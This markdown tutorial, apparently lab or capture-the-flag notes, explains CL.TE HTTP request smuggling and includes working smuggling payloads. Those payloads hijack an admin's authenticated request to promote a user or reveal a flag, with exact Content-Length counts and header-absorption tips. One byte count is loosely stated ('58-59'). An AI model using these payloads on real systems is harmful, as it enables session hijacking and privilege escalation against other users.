# 🔀 CL.TE Request Smuggling

## Overview

CL.TE vulnerabilities occur when:
- **Front-end (Reverse Proxy)**: Does NOT support chunked encoding → uses `Content-Length`
- **Back-end (Web Server)**: Correctly uses `Transfer-Encoding` (per RFC)

This discrepancy allows attackers to smuggle requests through the front-end.

---

## Foundation

### The Core Concept

Consider this malicious request:

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

### Front-end Perspective (Uses CL)

The front-end sees `Content-Length: 10` and parses:

```
0\r\n\r\nHELLO
```

**Result**: All 10 bytes consumed, request forwarded to back-end.

### Back-end Perspective (Uses TE)

The back-end prefers `Transfer-Encoding: chunked` and sees:

```
0\r\n\r\n
```

The `0` chunk terminates the body. The bytes `HELLO` remain **unconsumed** in the TCP stream.

### The Desync

```
Front-end: [Complete Request] → forwards to back-end
Back-end:  [Complete Request][HELLO leftover in TCP buffer]
```

The leftover `HELLO` becomes the **beginning of the next request**.

---

## Attack Scenario

### Step 1: Attacker Sends Smuggling Request

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

### Step 2: Victim Sends Normal Request

```http
GET / HTTP/1.1
Host: clte.htb
```

### TCP Stream Analysis

**Front-end view** (splits by Content-Length):

```
[Request 1: POST / ... body ends after "HELLO"]
[Request 2: GET / HTTP/1.1 ...]
```

**Back-end view** (splits by chunked encoding):

```
[Request 1: POST / ... body ends at "0\r\n\r\n"]
[Request 2: HELLOGET / HTTP/1.1 ...]  ← Invalid method!
```

### Result

The victim receives **HTTP 405 Method Not Allowed** because `HELLOGET` is not a valid HTTP method.

---

## Identification

### Test Requests

**Request 1** (Smuggling request):

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

**Request 2** (Probe request):

```http
GET / HTTP/1.1
Host: <TARGET>
```

### Testing Procedure

1. Open two tabs in Burp Repeater
2. Send Request 1 (smuggling request)
3. **Immediately** send Request 2 (probe request)
4. Observe response to Request 2

### Confirmation

If Request 2 returns **HTTP 405 Not Allowed** instead of HTTP 200, the target is vulnerable to CL.TE.

```
Expected (normal):    GET / → 200 OK
Observed (vuln):      GET / → 405 Not Allowed (because "HELLOGET" method)
```

---

## Exploitation

### Goal: Force Admin to Perform Action

Assume we want to force admin to access `/admin.php?promote_uid=2`

### Crafted Smuggling Request

```http
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
```

> **Note**: The `Dummy:` header "absorbs" the first line of the victim's request as a header value.

### What Happens

**Admin sends normal request**:

```http
GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```

**Front-end TCP stream view**:

```
[Our POST / with CL=52, body ends after "Dummy: "]
[Admin's GET / HTTP/1.1 ...]
```

**Back-end TCP stream view**:

```
[Our POST / with body ending at "0\r\n\r\n"]
[POST /admin.php?promote_uid=2 HTTP/1.1
 Dummy: GET / HTTP/1.1
 Host: clte.htb
 Cookie: sess=<admin_session_cookie>]  ← Admin's cookie attached!
```

### Result

The back-end sees:
1. Our harmless POST to `/`
2. **Admin's authenticated request** to `/admin.php?promote_uid=2`

The admin unknowingly promotes our user!

---

## Content-Length Calculation

### Important: Calculate CL Accurately

The `Content-Length` must include:

```
0\r\n
\r\n
POST /admin.php?promote_uid=2 HTTP/1.1\r\n
Dummy: 
```

### Counting Bytes

| Component | Bytes |
|-----------|-------|
| `0` | 1 |
| `\r\n` | 2 |
| `\r\n` | 2 |
| `POST /admin.php?promote_uid=2 HTTP/1.1` | 38 |
| `\r\n` | 2 |
| `Dummy: ` | 7 |
| **Total** | **52** |

---

## Practical Example: Reveal Flag

### Scenario

- Admin area at `/admin.php`
- Action: `/admin.php?reveal_flag=1`
- Only admin can reveal the flag

### Smuggling Request

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 59
Transfer-Encoding: chunked

0

GET /admin.php?reveal_flag=1 HTTP/1.1
DoesNotMatter:
```

### Content-Length Breakdown

```
0\r\n\r\n                                    = 5 bytes
GET /admin.php?reveal_flag=1 HTTP/1.1\r\n   = 39 bytes
DoesNotMatter:                               = 14 bytes
                                             = 58-59 bytes
```

### Execution

1. Send the smuggling request
2. Wait ~10 seconds for admin to visit the site
3. Admin's request gets transformed:

**Admin intended**:
```http
GET / HTTP/1.1
Host: target
Cookie: sess=ADMIN_COOKIE
```

**Back-end receives**:
```http
GET /admin.php?reveal_flag=1 HTTP/1.1
DoesNotMatter: GET / HTTP/1.1
Host: target
Cookie: sess=ADMIN_COOKIE
```

4. Check `/admin.php` - flag should be revealed!

---

## Tips & Tricks

### Timing is Critical

- Requests share TCP connection
- Send probe immediately after smuggling request
- In exploitation, wait for victim's request

### Header Absorption Technique

Use dummy headers to absorb victim's request line:

```http
Dummy: 
X-Ignore: 
Foo: 
```

The victim's `GET / HTTP/1.1` becomes a header value.

### Burp Suite Settings

- Disable "Update Content-Length" in Repeater
- Use `\r\n` (CRLF) line endings
- Check "Normalize HTTP/1 line endings" is OFF

### Common Indicators

| Response | Meaning |
|----------|---------|
| 405 Method Not Allowed | Smuggled prefix corrupted method |
| 400 Bad Request | Malformed smuggled request |
| Timeout | Request waiting for more data |
| Different response | Successfully influenced request |

---

## Diagram: CL.TE Attack Flow

```
┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
│   Attacker  │                  │  Front-end  │                  │  Back-end   │
└──────┬──────┘                  └──────┬──────┘                  └──────┬──────┘
       │                                │                                │
       │ POST / HTTP/1.1                │                                │
       │ CL: 10, TE: chunked            │                                │
       │ Body: "0\r\n\r\nHELLO"         │                                │
       │───────────────────────────────>│                                │
       │                                │ Uses CL=10                     │
       │                                │ Forwards all 10 bytes          │
       │                                │───────────────────────────────>│
       │                                │                                │ Uses TE
       │                                │                                │ Body ends at 0\r\n\r\n
       │                                │                                │ "HELLO" left in buffer
       │                                │                                │
       │                                │     Victim: GET / HTTP/1.1     │
       │                                │<───────────────────────────────│
       │                                │                                │
       │                                │───────────────────────────────>│
       │                                │                                │ Sees: "HELLOGET / HTTP/1.1"
       │                                │                                │ Returns 405!
       │                                │<───────────────────────────────│
       │                                │         405 Not Allowed        │
```

---

## References

- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [RFC 2616 - HTTP/1.1](https://tools.ietf.org/html/rfc2616)
- [James Kettle - HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks)

